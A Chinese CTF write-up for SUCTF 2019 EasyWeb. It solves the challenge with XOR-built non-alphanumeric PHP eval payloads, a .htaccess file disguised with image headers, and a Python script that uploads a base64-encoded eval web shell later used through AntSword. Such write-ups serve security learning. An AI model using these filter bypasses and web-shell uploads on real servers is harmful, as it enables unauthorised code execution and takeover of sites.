---
title: '[SUCTF 2019]EasyWeb'
date: 2024-06-18 15:45:33
tags: 
      - 题解
      - 文件上传
categories: 刷题笔记
---

### [SUCTF 2019]EasyWeb（异或rce，.htaccess文件上传）

我们打开页面，发现好大一串代码，我们进行代码审计

```
<?php
function get_the_flag(){
    // webadmin will remove your upload file every 20 min!!!! 
    $userdir = "upload/tmp_".md5($_SERVER['REMOTE_ADDR']);
    if(!file_exists($userdir)){
    mkdir($userdir);
    }
    if(!empty($_FILES["file"])){
        $tmp_name = $_FILES["file"]["tmp_name"];
        $name = $_FILES["file"]["name"];
        $extension = substr($name, strrpos($name,".")+1);
    if(preg_match("/ph/i",$extension)) die("^_^"); 
        if(mb_strpos(file_get_contents($tmp_name), '<?')!==False) die("^_^");
    if(!exif_imagetype($tmp_name)) die("^_^"); 
        $path= $userdir."/".$name;
        @move_uploaded_file($tmp_name, $path);
        print_r($path);
    }
}

$hhh = @$_GET['_'];

if (!$hhh){
    highlight_file(__FILE__);
}

if(strlen($hhh)>18){
    die('One inch long, one inch strong!');
}

if ( preg_match('/[\x00- 0-9A-Za-z\'"\`~_&.,|=[\x7F]+/i', $hhh) )
    die('Try something else!');

$character_type = count_chars($hhh, 3);
if(strlen($character_type)>12) die("Almost there!");

eval($hhh);
?>
```

我们可以发现代码最后要进行命令执行，但对我们的参数内容进行了过滤，所以为无字母数字rce，我们可以用取反、自增、异或来构造我们所需代码，但由于长度进行了限制，我们不能通过取反和自增来进行命令执行，我们只能用异或

<!--more-->

我们构造异或脚本

```
<?php
function finds($string){
	$index = 0;
	$a=[33,35,36,37,40,41,42,43,45,47,58,59,60,62,63,64,92,93,94,123,125,128,129,130,131,132,133,134,135,136,137,138,139,140,141,142,143,144,145,146,147,148,149,150,151,152,153,154,155,156,157,158,159,160,161,162,163,164,165,166,167,168,169,170,171,172,173,174,175,176,177,178,179,180,181,182,183,184,185,186,187,188,189,190,191,192,193,194,195,196,197,198,199,200,201,202,203,204,205,206,207,208,209,210,211,212,213,214,215,216,217,218,219,220,221,222,223,224,225,226,227,228,229,230,231,232,233,234,235,236,237,238,239,240,241,242,243,244,245,246,247,248,249,250,251,252,253,254,255];
	for($i=27;$i<count($a);$i++){
		for($j=27;$j<count($a);$j++){
			$x = $a[$i] ^ $a[$j];
			for($k = 0;$k<strlen($string);$k++){
				if(ord($string[$k]) == $x){
					echo $string[$k]."\n";
					echo '%' . dechex($a[$i]) . '^%' . dechex($a[$j])."\n";
					$index++;
					if($index == strlen($string)){
						return 0;
					}
				}
			}
		}
	}
}
finds("_GET");
?>

```

运行得到，因为这里还有字符种类限制，所以前面的都得一样

![image-20240618162618708](https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202406181626811.png)

我们得到payload

```
?_=${%86%86%86%86^%d9%c1%c3%d2}{%86}();&%86=phpinfo

```

![image-20240618162739291](https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202406181627433.png)



我们可以看到phpinfo()页面,php版本为7.2

**非预期解**

flag在phpinfo()里面

![image-20240618170054121](https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202406181700148.png)

**预期解**

我们再看一下get_the_flag函数

```
function get_the_flag(){
    // webadmin will remove your upload file every 20 min!!!! 
    $userdir = "upload/tmp_".md5($_SERVER['REMOTE_ADDR']);
    if(!file_exists($userdir)){
    mkdir($userdir);
    }
    if(!empty($_FILES["file"])){
        $tmp_name = $_FILES["file"]["tmp_name"];
        $name = $_FILES["file"]["name"];
        $extension = substr($name, strrpos($name,".")+1);
    if(preg_match("/ph/i",$extension)) die("^_^"); 
        if(mb_strpos(file_get_contents($tmp_name), '<?')!==False) die("^_^");
    if(!exif_imagetype($tmp_name)) die("^_^"); 
        $path= $userdir."/".$name;
        @move_uploaded_file($tmp_name, $path);
        print_r($path);
    }
}
```

代码审计可知文件路径会自动打印出来，但过滤了ph后缀，同时文件中不能有<?,而且要传图片。

由于过滤了ph后缀，我们首先要想到传.htaccess或者在有php文件的情况下传user.ini，这题是传.htaccess

然后就是新姿势了，就是怎么让.htaccess文件被判断成图片。直接在文件内容前加上GIF89a是不行的，我们考虑两种新方法

**方法1：**

```
在文件前加
#define width 1337
#define height 1337

```

**方法2：**

```
在.htaccess前添加x00x00x8ax39x8ax39(要在十六进制编辑器中添加，或者使用python的bytes类型)
x00x00x8ax39x8ax39 是wbmp文件的文件头
.htaccess中以0x00开头的同样也是注释符，所以不会影响.htaccess
```

由于文件内容过滤了<?,我们就不能写php代码了，我们可能会想到<script language="php"></script>,但由于该题的php版本太高，这种方法不适用了，我们解锁新知识

```
#define width 1337
#define height 1337 
AddType application/x-httpd-php .ashhh
php_value auto_append_file "php://filter/convert.base64-decode/resource=./123.ashhh

```

这里是利用auto_append_file来包含base64解码的123.ashhh文章，这样往123.ashhh里写base64加密的马，就能绕过<?了

但是还有一个细节需要注意，我们的123.ashhh也需要是个图片，需要在前面加上GIF89a，但是这只有6个字符，需要再随便加上2个base64有的字符，这样解码的时候才能正确解码，而且不会影响到后面的PHP一句话：

```
GIF89a12		
#12是为了补足8个字节，满足base64编码的规则
PD9waHAgZXZhbCgkX1JFUVVFU1RbJ2NtZCddKTs/Pg==
//<?php eval($_REQUEST['cmd']);?>
```

然后我们要上传脚本

```
import requests
import base64

htaccess = b"""
#define width 1337
#define height 1337 
AddType application/x-httpd-php .ahhh
php_value auto_append_file "php://filter/convert.base64-decode/resource=./shell.ahhh"
"""
shell = b"GIF89a12" + base64.b64encode(b"<?php eval($_REQUEST['cmd']);?>")
url = "http://11754899-c423-45d0-8d84-e960fa206bcb.node5.buuoj.cn:81/?_=${%86%86%86%86^%d9%c1%c3%d2}{%86}();&%86=get_the_flag"

files = {'file':('.htaccess',htaccess,'image/jpeg')}
data = {"upload":"Submit"}
response = requests.post(url=url, data=data, files=files)
print(response.text)

files = {'file':('shell.ahhh',shell,'image/jpeg')}
response = requests.post(url=url, data=data, files=files)
print(response.text)

```

得到路径

![image-20240618165755351](https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202406181657375.png)

我们访问shell.ahhh

![image-20240618190810063](https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202406181908176.png)

上传成功，我们打开蚁剑进行连接

![image-20240618190903048](https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202406181909107.png)

连接成功，在根目录找到flag

![image-20240618190956410](https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202406181909461.png)
